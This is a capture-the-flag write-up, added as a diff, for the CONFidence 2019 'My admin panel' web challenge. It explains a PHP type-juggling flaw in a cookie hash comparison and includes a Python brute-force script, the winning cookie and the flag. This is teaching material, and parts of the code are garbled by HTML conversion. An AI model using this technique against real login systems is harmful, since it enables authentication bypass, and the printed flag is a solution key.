@@ -1,0 +1,142 @@
+<h1>CONFidence CTF Teaser 2019 – My admin panel</h1>
+
+<ul>
+<li><strong>Category:</strong> web, warmup</li>
+<li><strong>Points:</strong> 51</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>I think I've found something interesting, but I'm not really a PHP expert. Do you think it's exploitable?</p>
+  
+  <p>https://gameserver.zajebistyc.tf/admin/</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>The website has directory listing active, connecting to it two files are listed:
+* <code>login.php</code>
+* <code>login.php.bak</code></p>
+
+<p>The first page prints the message: <code>Not authenticated.</code>.</p>
+
+<p>The <a href="login.php.bak">second file</a> contains the PHP source code.</p>
+
+<p>```php
+<?php</p>
+
+<p>include '../func.php';
+include '../config.php';</p>
+
+<p>if (!$_COOKIE['otadmin']) {
+    exit("Not authenticated.\n");
+}</p>
+
+<p>if (!preg<em>match('/^{"hash": [0-9A-Z\"]+}$/', $</em>COOKIE['otadmin'])) {
+    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
+    exit();
+}</p>
+
+<p>$session<em>data = json</em>decode($_COOKIE['otadmin'], true);</p>
+
+<p>if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }</p>
+
+<p>if ($session<em>data['hash'] != strtoupper(MD5($cfg</em>pass))) {
+    echo("I CAN EVEN GIVE YOU A HINT XD \n");</p>
+
+<pre><code>for ($i = 0; i &lt; strlen(MD5('xDdddddd')); i++) {
+    echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0);
+}
+
+exit("\n");
+</code></pre>
+
+<p>}</p>
+
+<p>display_admin();
+```</p>
+
+<p>Analyzing it, you can discover that a cookie named <code>otadmin</code> must be passed and its format must follow the following regex: <code>/^{"hash": [0-9A-Z\"]+}$/</code>.</p>
+
+<p>A correct value for that cookie can be the following: <code>{"hash": "T35T"}</code>.</p>
+
+<p>If the passed value for that cookie is different from the MD5 hash of the <code>$cfg_pass</code> variable, a hint is given. You can use the correct value crafted befor to print it.</p>
+
+<p><code>
+I CAN EVEN GIVE YOU A HINT XD 0006464640640064000646464640006400640640646400
+</code></p>
+
+<p>The hint is obtained by the following snippet.</p>
+
+<p><code>php
+    for ($i = 0; i &lt; strlen(MD5('xDdddddd')); i++) {
+        echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0);
+    }
+</code></p>
+
+<p>Where <code>strlen(MD5('xDdddddd'))</code> is equals to 32 (i.e. the length of MD5 hashes is 32).</p>
+
+<p>In that snippet, an AND operation is performed between the ASCII value of each char and the constant <code>0xC0</code> (i.e. <code>11000000</code>). Considering that the first three chars of the hint are 0, it means that the first original chars of the hash were numbers. That is due to the fact in the ASCII representation of numbers, the first most significant bits are <code>00</code> and the AND operation for that bits is performed with <code>11</code>.</p>
+
+<p>So, the problem could be located in a <em>type juggling</em> in this comparison:</p>
+
+<p><code>php
+$session_data['hash'] != strtoupper(MD5($cfg_pass))
+</code></p>
+
+<p>To exploit it, you have to guess the numbers at the beginning of the MD5 string.</p>
+
+<p>A <a href="my-admin-panel.py">Python script</a> can be written to exploit this task.</p>
+
+<p>```python
+import time
+import random
+import os
+import urllib2</p>
+
+<p>target<em>url = "https://gameserver.zajebistyc.tf/admin/login.php"
+cookie</em>name = "otadmin"
+cookie_value = "{{\"hash\": {}}}"</p>
+
+<h1>Check cookie method.</h1>
+
+<p>def check<em>cookie(value</em>to_check):</p>
+
+<p># Trying cookie.
+   cookie = "{}={}".format(cookie<em>name, cookie</em>value.format(value<em>to</em>check))
+   print "[*] Trying cookie {}".format(cookie) <br />
+   req = urllib2.Request(target<em>url)
+   req.add</em>header("Cookie", cookie)
+   req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);")
+   page = urllib2.urlopen(req)
+   content = page.read()</p>
+
+<p># Flag found.
+   if "p4{" in content:
+      print content
+      return True
+   else:
+      return False</p>
+
+<h1>Main method.</h1>
+
+<p>for i in range(1, 1000):</p>
+
+<p>try:</p>
+
+<pre><code>  if check_cookie(i):
+     break
+</code></pre>
+
+<p>except urllib2.HTTPError as err:
+      print "[*] Response &gt; {}".format(err.code)
+      break</p>
+
+<p>```</p>
+
+<p>With the cookie <code>otadmin={"hash": 389}</code> you will discover the flag.</p>
+
+<p><code>
+p4{wtf_php_comparisons_how_do_they_work}
+</code></p>
